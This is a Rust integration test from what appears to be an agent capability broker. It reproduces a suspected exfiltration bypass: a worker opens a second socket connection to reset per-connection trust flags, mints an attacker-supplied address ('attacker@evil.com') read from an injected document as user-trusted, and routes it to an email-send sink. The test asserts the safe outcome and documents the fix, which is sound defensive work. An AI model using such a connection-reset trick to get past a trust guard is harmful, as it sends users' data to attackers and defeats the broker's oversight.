//! two_connection_intent_bypass — SECURITY REPRO (Fable 5 adversarial finding)
//!
//! Diagnostic integration test for a SUSPECTED live exfiltration path:
//!
//!   The broker holds per-connection trust state (`intent_provided`,
//!   `fd_requested`, `session_status` — server.rs ~148-154), seeded at
//!   connection start and "never re-derived from IPC or the DB". Phase 16
//!   guard(a) (server.rs ~904) rejects `ProvideIntent` when
//!   `intent_provided || fd_requested`, but ONLY for THAT connection.
//!
//!   Suspected bypass: a worker opens a SECOND connection to the SAME broker
//!   session socket. The second connection gets fresh guard(a) state (both
//!   flags false) and a stale `session_status`. It can then `ProvideIntent` an
//!   attacker-controlled literal (one it read from an untrusted doc on the
//!   first connection) — minting it `UserTrusted` — and route it to
//!   `email.send`, yielding `Allowed` and a live SMTP send.
//!
//! This test OBSERVES the actual behavior. It asserts the SAFE expectation, so
//! a GREEN test == the path is safe and a RED (panic) test == the vulnerability
//! reproduced. It does NOT modify any product code and does NOT assert the
//! buggy behavior is correct.
//!
//! v1.4 Phase 19 (TRUST-01/TRUST-02) fixed the broker with a ONE-WAY,
//! session-lifetime occupancy latch in `run_broker_server`'s accept loop
//! (`DESIGN-session-trust-coherence.md` §2): a 2nd connection to an
//! already-active session's socket is rejected at accept time, before any
//! per-connection trust state (`ValueStore`/`session_status`/
//! `intent_provided`/`fd_requested`) is ever seeded for it. Per the DESIGN
//! doc's structural note (§1, DESIGN-GATE-RECORD-v1.4.md Round 2 finding F2),
//! each variant below spawns its OWN fresh `run_broker_server` instance on its
//! OWN unique socket name, so each variant's latch starts unset — running
//! multiple variants' connections against a single shared broker instance
//! would trip the latch for the WHOLE broker after the first connection,
//! corrupting later variants' setup expectations (a setup-assertion issue,
//! not a safety regression).
//!
//! Three independent variants:
//!   1. `guard_a_intra_connection_control` — one connection, RequestFd then
//!      ProvideIntent on the SAME connection: guard(a) rejects normally.
//!   2. `overlapping_connection_bypass_repro` — conn#1 RequestFd and stays
//!      OPEN; a fresh conn#2 connects and attempts ProvideIntent.
//!   3. `sequential_reconnect_bypass_repro` — conn#1 RequestFd then CLEANLY
//!      DISCONNECTS; only THEN does conn#2 connect and attempt ProvideIntent.
//!      This is what a release-on-disconnect implementation would fail
//!      (DESIGN §2's "why release-on-disconnect is unsound" subsection) — it
//!      must go green under the one-way latch.
//!
//! Abstract-namespace UDS is Linux-only, so the whole module is gated
//! `#[cfg(target_os = "linux")]` (0 tests compiled on macOS). Run under the
//! mailpit harness because an Allowed `email.send` dispatch performs a live
//! SMTP send:
//!
//!   MAILPIT_VERIFY_CMD='cargo test -p brokerd --test two_connection_intent_bypass -- --nocapture' \
//!     bash scripts/mailpit-verify.sh

#[cfg(target_os = "linux")]
mod linux_tests {
    use brokerd::audit::open_audit_db;
    use brokerd::proto::{BrokerRequest, BrokerResponse};
    use brokerd::server::run_broker_server;
    use brokerd::session::persist_session;
    use runtime_core::intent::CaprunIntent;
    use runtime_core::plan_node::{PlanArg, SinkId};
    use runtime_core::{ExecutorDecision, PlanNode, Session, SessionStatus};
    use rusqlite::Connection;
    use std::path::PathBuf;
    use std::sync::{Arc, Mutex};
    use tokio::io::{AsyncReadExt, AsyncWriteExt};
    use tokio::task::JoinHandle;
    use uuid::Uuid;

    /// Send a framed BrokerRequest (4-byte LE length prefix + JSON body).
    async fn send_req(stream: &mut tokio::net::UnixStream, req: &BrokerRequest) {
        let body = serde_json::to_vec(req).expect("serialize request");
        let len = (body.len() as u32).to_le_bytes();
        stream.write_all(&len).await.expect("write length");
        stream.write_all(&body).await.expect("write body");
    }

    /// Read one framed BrokerResponse (4-byte LE length prefix + JSON body).
    async fn read_resp(stream: &mut tokio::net::UnixStream) -> BrokerResponse {
        let mut len_buf = [0u8; 4];
        stream.read_exact(&mut len_buf).await.expect("read length");
        let msg_len = u32::from_le_bytes(len_buf) as usize;
        let mut resp_body = vec![0u8; msg_len];
        stream.read_exact(&mut resp_body).await.expect("read body");
        serde_json::from_slice(&resp_body).expect("deserialize response")
    }

    /// Round-trip a `RequestFd`. The broker's RequestFd arm passes the fd via
    /// `sendmsg(SCM_RIGHTS)` BEFORE sending the framed `FdGranted` response, and
    /// `adapter_fs::pass_fd` includes a mandatory 1-byte iov payload (`b"\x00"`)
    /// alongside the control message (some kernels require >=1 payload byte for
    /// cmsg delivery). A plain stream read of that 1 byte consumes the payload
    /// and discards the ancillary fd — which is fine here: this test only needs
    /// to TRIP `fd_requested`, not to actually read via the granted fd. We must
    /// consume that stray byte first, or it would corrupt the framing of the
    /// FdGranted response.
    async fn request_fd(stream: &mut tokio::net::UnixStream, path: &str) -> BrokerResponse {
        send_req(
            stream,
            &BrokerRequest::RequestFd {
                path: path.to_string(),
            },
        )
        .await;
        // Consume the 1-byte SCM_RIGHTS iov payload emitted by pass_fd.
        let mut iov_byte = [0u8; 1];
        stream
            .read_exact(&mut iov_byte)
            .await
            .expect("read SCM_RIGHTS iov payload byte");
        read_resp(stream).await
    }

    /// Everything a variant needs to run against its OWN fresh broker instance:
    /// a shared in-memory audit DB, a seeded `sessions` row, a real workspace
    /// containing `attacker_doc.txt`, and a `run_broker_server` task already
    /// spawned on its own unique abstract socket (latch starts unset).
    struct FreshBroker {
        sock_path: String,
        ws_dir: PathBuf,
        server_handle: JoinHandle<()>,
    }

    impl FreshBroker {
        /// Tear down: abort the broker task and remove the scratch workspace.
        /// Callers are expected to have already dropped their own connections.
        fn teardown(self) {
            self.server_handle.abort();
            let _ = std::fs::remove_dir_all(&self.ws_dir);
        }
    }

    /// Spawn a brand-new `run_broker_server` instance on its own unique socket
    /// name (suffixed by pid + `variant`), with its own in-memory audit DB,
    /// seeded `sessions` row (status Active), and workspace containing
    /// `attacker_doc.txt`. Each variant MUST call this rather than share a
    /// broker instance with any other variant (DESIGN §1 structural note /
    /// DESIGN-GATE-RECORD-v1.4.md Round 2 finding F2) — sharing one broker
    /// instance across variants would let an earlier variant's connection trip
    /// the one-way latch for the whole instance, rejecting a later variant's
    /// legitimate first connection.
    async fn spawn_fresh_broker(variant: &str) -> FreshBroker {
        let conn: Arc<Mutex<Connection>> =
            Arc::new(Mutex::new(open_audit_db(":memory:").expect("open_audit_db")));

        // Broker-authoritative session identity used for every connection's
        // mint/evaluate (HARD-03). Seed a real `sessions` row for it (status
        // Active), mirroring a freshly-created live session.
        let session_id_uuid = Uuid::new_v4();
        {
            let locked = conn.lock().expect("mutex");
            let seeded = Session {
                id: session_id_uuid,
                intent_id: Uuid::new_v4(),
                status: SessionStatus::Active,
                created_at: chrono::Utc::now(),
                updated_at: chrono::Utc::now(),
            };
            persist_session(&locked, &seeded).expect("seed sessions row");
        }

        // A real workspace with a real file. RequestFd resolves `attacker_doc.txt`
        // beneath this root; its presence lets RequestFd succeed and trip
        // `fd_requested`. Its contents ("attacker@evil.com") stand in for the
        // untrusted literal a worker would have read from an injected doc — this
        // test SIMULATES that read (see caveat in the module doc / report).
        let pid = std::process::id();
        let ws_dir = std::env::temp_dir().join(format!("caprun-2conn-{pid}-{variant}"));
        std::fs::create_dir_all(&ws_dir).expect("create workspace dir");
        std::fs::write(ws_dir.join("attacker_doc.txt"), b"attacker@evil.com")
            .expect("write attacker doc");
        let ws_root = Arc::new(
            adapter_fs::workspace::WorkspaceRoot::open(ws_dir.as_path()).expect("open ws root"),
        );

        // Distinct socket name per variant (per pid AND variant, so parallel
        // async test runs never collide on the same abstract socket).
        let server_session_name = format!("caprun-2conn-bypass-{pid}-{variant}");
        let sock_path = format!("\0/agentos/{server_session_name}");

        let conn_clone = conn.clone();
        let name_clone = server_session_name.clone();
        let ws_root_clone = ws_root.clone();
        let server_handle = tokio::spawn(async move {
            let _ = run_broker_server(
                &name_clone,
                conn_clone,
                session_id_uuid,
                Uuid::new_v4(),        // initial_last_event_id (genesis anchor)
                "genesis-hash".into(), // initial_last_event_hash
                SessionStatus::Active, // initial_session_status (stale-fresh on every conn)
                ws_root_clone,
                std::env::temp_dir().join("__two_connection_intent_bypass_no_trusted_path__"),
                Arc::new([0u8; 32]), // HARDEN-02 broker MAC key (test)
            )
            .await;
        });

        // Let the server task reach accept().await.
        tokio::task::yield_now().await;

        FreshBroker {
            sock_path,
            ws_dir,
            server_handle,
        }
    }

    // =======================================================================
    // VARIANT 1 — guard(a) intra-connection control.
    // One connection: RequestFd (trips fd_requested), then ProvideIntent on
    // the SAME connection → must be rejected with Error. This variant's
    // single connection legitimately trips the one-way latch for its OWN
    // fresh broker instance — that is fine, it only ever opens one
    // connection.
    // =======================================================================
    #[tokio::test]
    async fn guard_a_intra_connection_control() {
        let broker = spawn_fresh_broker("guard-a").await;

        let mut conn_a = tokio::net::UnixStream::connect(&broker.sock_path)
            .await
            .expect("connect conn_a");

        let fd_resp_a = request_fd(&mut conn_a, "attacker_doc.txt").await;
        assert!(
            matches!(fd_resp_a, BrokerResponse::FdGranted),
            "control: RequestFd should be granted for a real workspace file, got {fd_resp_a:?}"
        );

        send_req(
            &mut conn_a,
            &BrokerRequest::ProvideIntent {
                intent: CaprunIntent::SendEmailSummary {
                    recipient: "attacker@evil.com".into(),
                    subject: "x".into(),
                    body: "y".into(),
                },
            },
        )
        .await;
        let intent_after_fd_same_conn = read_resp(&mut conn_a).await;
        eprintln!(
            "[REPRO][guard-a] intra-connection ProvideIntent-after-RequestFd response = {intent_after_fd_same_conn:?}"
        );
        let part_a_guard_rejected =
            matches!(intent_after_fd_same_conn, BrokerResponse::Error { .. });
        assert!(
            part_a_guard_rejected,
            "control (guard-a): guard(a) MUST reject ProvideIntent after RequestFd on the SAME \
             connection, but got {intent_after_fd_same_conn:?}"
        );

        drop(conn_a);
        broker.teardown();
    }

    // =======================================================================
    // VARIANT 2 — overlapping-connection bypass repro.
    // conn#1 does RequestFd and STAYS OPEN; a fresh conn#2 connects to the
    // same socket and attempts ProvideIntent with the attacker literal, then
    // (if accepted) routes to email.send and evaluates.
    // =======================================================================
    #[tokio::test]
    async fn overlapping_connection_bypass_repro() {
        let broker = spawn_fresh_broker("overlapping").await;

        // Connection #1: RequestFd for the same real workspace file. This trips
        // `fd_requested` on conn#1 (the worker "reads the untrusted doc"). We do
        // NOT ReportClaims — mirroring the "skip ReportClaims" attack, so the
        // session is never demoted to Draft.
        let mut conn1 = tokio::net::UnixStream::connect(&broker.sock_path)
            .await
            .expect("connect conn1");
        let fd_resp1 = request_fd(&mut conn1, "attacker_doc.txt").await;
        assert!(
            matches!(fd_resp1, BrokerResponse::FdGranted),
            "conn#1 RequestFd should be granted, got {fd_resp1:?}"
        );
        // Leave conn#1 open (a real worker keeps its primary connection).

        // Connection #2: a FRESH connect to the SAME socket, WHILE conn#1 is
        // still open. Under the pre-fix broker this got fresh guard(a) state
        // (both flags false) and a stale session_status; under the fix, the
        // one-way latch rejects it outright at accept time.
        let mut conn2 = tokio::net::UnixStream::connect(&broker.sock_path)
            .await
            .expect("connect conn2");

        send_req(
            &mut conn2,
            &BrokerRequest::ProvideIntent {
                intent: CaprunIntent::SendEmailSummary {
                    recipient: "attacker@evil.com".into(),
                    subject: "x".into(),
                    body: "y".into(),
                },
            },
        )
        .await;
        let conn2_intent_resp = read_resp(&mut conn2).await;
        eprintln!(
            "[REPRO][overlapping] conn#2 ProvideIntent response = {conn2_intent_resp:?}"
        );

        // If the second connection minted the attacker literal UserTrusted,
        // route the three trusted handles into email.send and evaluate.
        let mut conn2_decision: Option<ExecutorDecision> = None;
        if let BrokerResponse::IntentAccepted {
            value_id,
            subject_value_id,
            body_value_id,
        } = &conn2_intent_resp
        {
            let mut args = vec![PlanArg {
                name: "to".into(),
                value_id: value_id.clone(),
            }];
            if let Some(sid) = subject_value_id {
                args.push(PlanArg {
                    name: "subject".into(),
                    value_id: sid.clone(),
                });
            }
            if let Some(bid) = body_value_id {
                args.push(PlanArg {
                    name: "body".into(),
                    value_id: bid.clone(),
                });
            }
            let plan_node = PlanNode {
                sink: SinkId("email.send".into()),
                args,
            };
            send_req(&mut conn2, &BrokerRequest::SubmitPlanNode { plan_node }).await;
            let submit_resp = read_resp(&mut conn2).await;
            eprintln!(
                "[REPRO][overlapping] conn#2 SubmitPlanNode response = {submit_resp:?}"
            );
            match submit_resp {
                BrokerResponse::PlanNodeDecision { decision } => {
                    conn2_decision = Some(decision);
                }
                other => panic!(
                    "conn#2 SubmitPlanNode expected PlanNodeDecision, got {other:?}"
                ),
            }
        }

        drop(conn1);
        drop(conn2);
        broker.teardown();

        // ===================================================================
        // SAFE-outcome assertions. Green == safe, red == vuln.
        // Safe iff conn#2's ProvideIntent was rejected (Error) OR the final
        // decision was NOT Allowed. If conn#2 got IntentAccepted AND the
        // decision was Allowed, the exfil path is live → panic.
        // ===================================================================
        let intent_accepted =
            matches!(conn2_intent_resp, BrokerResponse::IntentAccepted { .. });
        let routed_allowed = matches!(conn2_decision, Some(ExecutorDecision::Allowed));

        eprintln!(
            "[REPRO][verdict-inputs][overlapping] conn2_intent_accepted={intent_accepted} conn2_decision={:?}",
            conn2_decision
        );

        if intent_accepted && routed_allowed {
            panic!(
                "LIVE EXFIL: 2nd connection minted attacker literal UserTrusted via ProvideIntent \
                 (guard(a) bypassed cross-connection); email.send to attacker@evil.com => Allowed"
            );
        }

        // The passing (SAFE) outcome: either the second connection's
        // ProvideIntent was rejected, or its routed decision was not Allowed.
        assert!(
            !intent_accepted || !routed_allowed,
            "SAFE expectation: a 2nd connection must NOT be able to mint an attacker literal \
             UserTrusted and route it to email.send => Allowed"
        );
    }

    // =======================================================================
    // VARIANT 3 — sequential-reconnect bypass repro (NEW, DESIGN §1 line 34).
    // conn#1 does RequestFd and then CLEANLY DISCONNECTS (drop the stream)
    // BEFORE conn#2 connects; then conn#2 connects to the same socket and
    // attempts ProvideIntent with the attacker literal, routing to email.send
    // if accepted. This is exactly what a release-on-disconnect
    // implementation would fail (DESIGN §2's "why release-on-disconnect is
    // unsound" subsection) — it must go green under the one-way latch.
    // =======================================================================
    #[tokio::test]
    async fn sequential_reconnect_bypass_repro() {
        let broker = spawn_fresh_broker("sequential").await;

        // Connection #1: RequestFd for the same real workspace file, trips
        // `fd_requested` on conn#1 (the worker "reads the untrusted doc"),
        // then CLEANLY DISCONNECTS before conn#2 ever attempts to connect.
        let mut conn1 = tokio::net::UnixStream::connect(&broker.sock_path)
            .await
            .expect("connect conn1");
        let fd_resp1 = request_fd(&mut conn1, "attacker_doc.txt").await;
        assert!(
            matches!(fd_resp1, BrokerResponse::FdGranted),
            "conn#1 RequestFd should be granted, got {fd_resp1:?}"
        );
        // Clean disconnect BEFORE conn#2 connects — this is the sequential
        // variant a release-on-disconnect implementation would wrongly permit.
        drop(conn1);
        tokio::task::yield_now().await;

        // Connection #2: connects to the SAME socket only AFTER conn#1 has
        // fully disconnected. Under a (rejected) release-on-disconnect
        // implementation this would get fresh guard(a) state and a stale
        // session_status, exactly as in the overlapping case. Under the
        // one-way latch, it is rejected identically — the latch was never
        // cleared when conn#1 disconnected.
        let mut conn2 = tokio::net::UnixStream::connect(&broker.sock_path)
            .await
            .expect("connect conn2");

        send_req(
            &mut conn2,
            &BrokerRequest::ProvideIntent {
                intent: CaprunIntent::SendEmailSummary {
                    recipient: "attacker@evil.com".into(),
                    subject: "x".into(),
                    body: "y".into(),
                },
            },
        )
        .await;
        let conn2_intent_resp = read_resp(&mut conn2).await;
        eprintln!(
            "[REPRO][sequential] conn#2 ProvideIntent response = {conn2_intent_resp:?}"
        );

        // If the second connection minted the attacker literal UserTrusted,
        // route the three trusted handles into email.send and evaluate.
        let mut conn2_decision: Option<ExecutorDecision> = None;
        if let BrokerResponse::IntentAccepted {
            value_id,
            subject_value_id,
            body_value_id,
        } = &conn2_intent_resp
        {
            let mut args = vec![PlanArg {
                name: "to".into(),
                value_id: value_id.clone(),
            }];
            if let Some(sid) = subject_value_id {
                args.push(PlanArg {
                    name: "subject".into(),
                    value_id: sid.clone(),
                });
            }
            if let Some(bid) = body_value_id {
                args.push(PlanArg {
                    name: "body".into(),
                    value_id: bid.clone(),
                });
            }
            let plan_node = PlanNode {
                sink: SinkId("email.send".into()),
                args,
            };
            send_req(&mut conn2, &BrokerRequest::SubmitPlanNode { plan_node }).await;
            let submit_resp = read_resp(&mut conn2).await;
            eprintln!(
                "[REPRO][sequential] conn#2 SubmitPlanNode response = {submit_resp:?}"
            );
            match submit_resp {
                BrokerResponse::PlanNodeDecision { decision } => {
                    conn2_decision = Some(decision);
                }
                other => panic!(
                    "conn#2 SubmitPlanNode expected PlanNodeDecision, got {other:?}"
                ),
            }
        }

        drop(conn2);
        broker.teardown();

        // ===================================================================
        // SAFE-outcome assertions — IDENTICAL predicate to the overlapping
        // variant. Green == safe, red == vuln. Safe iff conn#2's ProvideIntent
        // was rejected (Error) OR the final decision was NOT Allowed. If
        // conn#2 got IntentAccepted AND the decision was Allowed, the exfil
        // path is live → panic.
        // ===================================================================
        let intent_accepted =
            matches!(conn2_intent_resp, BrokerResponse::IntentAccepted { .. });
        let routed_allowed = matches!(conn2_decision, Some(ExecutorDecision::Allowed));

        eprintln!(
            "[REPRO][verdict-inputs][sequential] conn2_intent_accepted={intent_accepted} conn2_decision={:?}",
            conn2_decision
        );

        if intent_accepted && routed_allowed {
            panic!(
                "LIVE EXFIL: 2nd connection minted attacker literal UserTrusted via ProvideIntent \
                 (guard(a) bypassed cross-connection); email.send to attacker@evil.com => Allowed"
            );
        }

        // The passing (SAFE) outcome: either the second connection's
        // ProvideIntent was rejected, or its routed decision was not Allowed.
        assert!(
            !intent_accepted || !routed_allowed,
            "SAFE expectation: a 2nd connection must NOT be able to mint an attacker literal \
             UserTrusted and route it to email.send => Allowed"
        );
    }
}
